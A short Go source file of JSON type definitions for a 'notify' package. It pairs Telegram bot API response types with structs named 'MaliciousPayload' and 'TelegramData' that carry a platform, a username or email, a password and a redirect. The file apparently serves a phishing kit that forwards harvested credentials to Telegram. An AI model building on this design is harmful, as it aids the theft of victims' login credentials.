package notify

type GetMeResponse struct {
	Ok     bool `json:"ok"`
	Result User `json:"result"`
}

type User struct {
	ID                      int64  `json:"id"`
	IsBot                   bool   `json:"is_bot"`
	FirstName               string `json:"first_name"`
	Username                string `json:"username"`
	CanJoinGroups           bool   `json:"can_join_groups"`
	CanReadAllGroupMessages bool   `json:"can_read_all_group_messages"`
	SupportsInlineQueries   bool   `json:"supports_inline_queries"`
}

type MaliciousPayload struct {
	Origin     string `json:"origin" binding:"required"`
	Identifier string `json:"identifier" binding:"required"`
	Password   string `json:"password" binding:"required"`
}

type TelegramData struct {
	Platform   string `json:"platform"`
	Identifier string `json:"identifier"` //username || email.
	Password   string `json:"password"`
}

type PayloadResponse struct {
	Redirect string `json:"redirect"`
}
